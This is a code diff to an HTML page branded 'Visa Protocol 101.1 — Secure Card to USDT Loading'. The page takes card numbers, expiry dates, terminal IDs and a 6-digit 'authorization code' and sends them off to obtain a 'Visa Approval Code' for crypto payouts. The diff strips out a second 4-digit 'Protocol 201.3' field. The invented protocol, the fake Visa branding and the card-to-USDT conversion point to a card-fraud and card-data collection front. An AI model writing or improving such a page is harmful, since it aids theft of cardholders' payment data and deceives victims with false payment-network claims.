@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Visa Protocol 101.1 | 201.3</title>
+  <title>Visa Protocol 101.1 </title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -172,12 +172,11 @@
     <div class="header">
       <div class="badge">● SECURE VISA DIRECT</div>
       <h1>Card to USDT Loading</h1>
-      <p>Protocol 101.1 · 201.3</p>
+      <p>Protocol 101.1 </p>
     </div>
     <div class="protocol-tag">
       <span>101.1</span>
       <span>6-Digit Code</span>
-      <span>4-Digit Code</span>
       <span>TRC20</span>
     </div>
 
@@ -185,10 +184,6 @@
       <div class="form-group">
         <label>Protocol 101.1 — 6-Digit Authorization Code</label>
         <input type="text" class="code-input" id="code6" placeholder="000000" maxlength="6" pattern="[0-9]{6}" inputmode="numeric" required>
-      </div>
-      <div class="form-group">
-        <label>Protocol 201.3 — 4-Digit Confirmation Code</label>
-        <input type="text" class="code-input" id="code4" placeholder="0000" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required>
       </div>
       <hr style="border-color: rgba(255,255,255,0.06); margin: 16px 0;">
       <div class="form-group">
@@ -232,7 +227,7 @@
       <div class="approval-code-box" id="approvalCodes"></div>
     </div>
 
-    <div class="footer">Visa Protocol 101.1 · 201.3 — Secure Card to USDT Loading</div>
+    <div class="footer">Visa Protocol 101.1 — Secure Card to USDT Loading</div>
   </div>
 
   <script>
@@ -264,8 +259,7 @@
     });
 
     code6.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6); });
-    code4.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4); });
-
+  
     amountInput.addEventListener('input', (e) => {
       const amt = parseFloat(e.target.value) || 0;
       const net = amt * 0.975;
@@ -281,11 +275,9 @@
       approvalSection.classList.remove('show');
 
       if (code6.value.length !== 6) { showError('Protocol 101.1: 6-digit authorization code required'); return; }
-      if (code4.value.length !== 4) { showError('Protocol 201.3: 4-digit confirmation code required'); return; }
-
+     
       const payload = {
         protocol101_1: code6.value,
-        protocol201_3: code4.value,
         terminalId: document.getElementById('terminalId').value,
         cardNumber: cardInput.value.replace(/\s/g, ''),
         expiry: expiryInput.value.replace('/', ''),
@@ -308,7 +300,6 @@
           approvalSection.classList.add('show');
           approvalCodes.innerHTML = `
             <div><span class="label">Protocol 101.1:</span> <span class="value">${result.code101_1 || code6.value}</span></div>
-            <div><span class="label">Protocol 201.3:</span> <span class="value">${result.code201_3 || code4.value}</span></div>
             <div style="margin-top:8px; border-top:1px solid rgba(255,255,255,0.06); padding-top:8px;">
               <span class="label">Visa Approval Code:</span> <span class="value green">${result.approvalCode}</span>
             </div>
